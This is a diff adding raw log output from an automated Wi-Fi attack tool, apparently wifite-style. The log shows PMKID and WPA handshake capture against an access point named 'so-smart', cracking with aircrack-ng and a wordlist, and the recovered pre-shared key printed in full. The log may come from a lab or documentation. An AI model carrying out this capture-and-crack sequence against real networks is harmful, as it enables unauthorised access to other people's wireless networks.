@@ -1,0 +1,27 @@
+[+] (1/1) Starting attacks against DE:AD:BA:BE:00:01 (so-smart)
+[+] so-smart (58db) PMKID CAPTURE: Waiting for PMKID (1m18s)
+[+] so-smart (60db) WPA Handshake capture: Discovered new client:
+38:F9:D3:4C:0F:CF
+[+] so-smart (60db) WPA Handshake capture: Discovered new client:
+38:F9:D3:4A:8E:2A
+[+] so-smart (63db) WPA Handshake capture: Discovered new client:
+CE:93:5F:01:1E:E6
+[+] so-smart (60db) WPA Handshake capture: Captured handshake
+[+] saving copy of handshake to hs/handshake_sosmart_DE-AD-BA-BE-01_2024-
+06-06T17-42-05.cap saved
+[+] analysis of captured handshake file:
+[+] tshark: .cap file contains a valid handshake for de:ad:ba:be:00:01
+[!] aircrack: .cap file does not contain a valid handshake
+[+] Cracking WPA Handshake: Running aircrack-ng with wordlist-probable.txt
+wordlist
+[+] Cracking WPA Handshake: 100.00% ETA: 0s @ 2635.0kps (current key:
+02051975)
+[+] Cracked WPA Handshake PSK: lukrecja-szmaragdy-45
+[+] Access Point Name: so-smart
+[+] Access Point BSSID: DE:AD:BA:BE:00:01
+[+] Encryption: WPA
+[+] Handshake File: hs/handshake_sosmart_DE-AD-BA-BE-01_2024-06-
+06T17-42-05.cap
+[+] PSK (password): lukrecja-szmaragdy-45
+[+] saved crack result to cracked.json (1 total)
+[+] Finished attacking 1 target(s), exiting
